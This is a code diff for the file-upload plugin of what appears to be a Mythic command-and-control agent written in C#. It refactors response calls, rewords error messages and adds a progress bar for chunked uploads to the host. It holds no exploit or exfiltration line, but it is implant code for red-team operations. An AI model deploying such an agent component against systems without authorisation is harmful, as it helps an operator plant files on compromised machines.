@@ -1,10 +1,7 @@
 ﻿using Agent.Interfaces;
-
 using Agent.Models;
 using Agent.Utilities;
 using System.Collections.Concurrent;
-using System.Diagnostics;
-using System.IO;
 using System.Text.Json;
 using upload;
 
@@ -14,16 +11,12 @@ namespace Agent
     {
         public string Name => "upload";
         private IMessageManager messageManager { get; set; }
-        private ILogger logger { get; set; }
-        private ITokenManager tokenManager { get; set; }
         private IAgentConfig config { get; set; }
         private ConcurrentDictionary<string, ServerUploadJob> uploadJobs { get; set; }
         private Dictionary<string, FileStream> _streams { get; set; }
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
-            this.logger = logger;
-            this.tokenManager = tokenManager;
             this.uploadJobs = new ConcurrentDictionary<string, ServerUploadJob>();
             this._streams = new Dictionary<string, FileStream>();
             this.config = config;
@@ -35,10 +28,10 @@ namespace Agent
             string message = string.Empty;
             if (args is null || !args.Validate(out message))
             {
-                await messageManager.AddResponse(new DownloadTaskResponse
+                messageManager.AddTaskResponse(new DownloadTaskResponse
                 {
                     status = "error",
-                    process_response = new Dictionary<string, string> { { "message", message } },
+                    user_output = message,
                     completed = true,
                     task_id = job.task.id
                 }.ToJson());
@@ -57,7 +50,7 @@ namespace Agent
             //Add job to our tracker
             if(!uploadJobs.TryAdd(job.task.id, uploadJob))
             {
-                await messageManager.AddResponse(new DownloadTaskResponse
+                messageManager.AddTaskResponse(new DownloadTaskResponse
                 {
                     status = "error",
                     user_output = "failed to add job to tracker",
@@ -75,7 +68,7 @@ namespace Agent
             catch (Exception e)
             {
                 //Something went wrong and we can't upload here, inform the user
-                await messageManager.AddResponse(new TaskResponse
+                messageManager.AddTaskResponse(new TaskResponse
                 {
                     status = "error",
                     completed = true,
@@ -87,7 +80,7 @@ namespace Agent
             }
 
             //Officially kick off file upload with Mythic
-            await messageManager.AddResponse(new UploadTaskResponse
+            messageManager.AddTaskResponse(new UploadTaskResponse
             {
                 task_id = job.task.id,
                 upload = new UploadTaskResponseData
@@ -107,7 +100,7 @@ namespace Agent
             //Did we get an upload job
             if(uploadJob is null)
             {
-                await messageManager.AddResponse(new TaskResponse
+                messageManager.AddTaskResponse(new TaskResponse
                 {
                     status = "error",
                     completed = true,
@@ -120,7 +113,7 @@ namespace Agent
             //Did user request cancellation of the job?
             if (uploadJob.cancellationtokensource.IsCancellationRequested)
             {
-                await messageManager.AddResponse(new TaskResponse
+                messageManager.AddTaskResponse(new TaskResponse
                 {
                     status = "error",
                     completed = true,
@@ -136,7 +129,7 @@ namespace Agent
             {
                 if(response.total_chunks == 0)
                 {
-                    await messageManager.AddResponse(new TaskResponse
+                    messageManager.AddTaskResponse(new TaskResponse
                     {
                         status = "error",
                         completed = true,
@@ -152,13 +145,12 @@ namespace Agent
             //Did we get chunk data?
             if (String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
             {
-                await messageManager.AddResponse(new TaskResponse
+                messageManager.AddTaskResponse(new TaskResponse
                 {
                     status = "error",
                     completed = true,
                     task_id = response.task_id,
-                    process_response = new Dictionary<string, string> { { "message", "0x12" } },
-
+                    user_output = "chunk data was empty.",
                 }.ToJson());
                 return;
             }
@@ -166,7 +158,7 @@ namespace Agent
             //Write the chunk data to our stream
             if(!this.HandleNextChunk(Misc.Base64DecodeToByteArray(response.chunk_data), response.task_id))
             {
-                await messageManager.AddResponse(new TaskResponse
+                messageManager.AddTaskResponse(new TaskResponse
                 {
                     status = "error",
                     completed = true,
@@ -184,7 +176,7 @@ namespace Agent
             UploadTaskResponse ur = new UploadTaskResponse()
             {
                 task_id = response.task_id,
-                status = $"Processed {uploadJob.chunk_num}/{uploadJob.total_chunks}",
+                status = $"{GetStatusBar(uploadJob.chunk_num,uploadJob.total_chunks)}",
                 upload = new UploadTaskResponseData
                 {
                     chunk_num = uploadJob.chunk_num,
@@ -211,7 +203,7 @@ namespace Agent
             }
 
             //Return response
-            await messageManager.AddResponse(ur.ToJson());
+            messageManager.AddTaskResponse(ur.ToJson());
         }
 
         /// <summary>
@@ -265,6 +257,16 @@ namespace Agent
         private ServerUploadJob GetJob(string task_id)
         {
             return uploadJobs[task_id];
+        }
+        string GetStatusBar(int chunk_num, int total_chunks)
+        {
+            int barWidth = 50; // Width of the status bar in characters
+            double progress = (double)chunk_num / total_chunks;
+            int filledBars = (int)(progress * barWidth);
+            int emptyBars = barWidth - filledBars;
+
+            string bar = new string('#', filledBars) + new string('-', emptyBars);
+            return $"[{bar}] {progress:P0}"; // \r overwrites the current line
         }
     }
 }
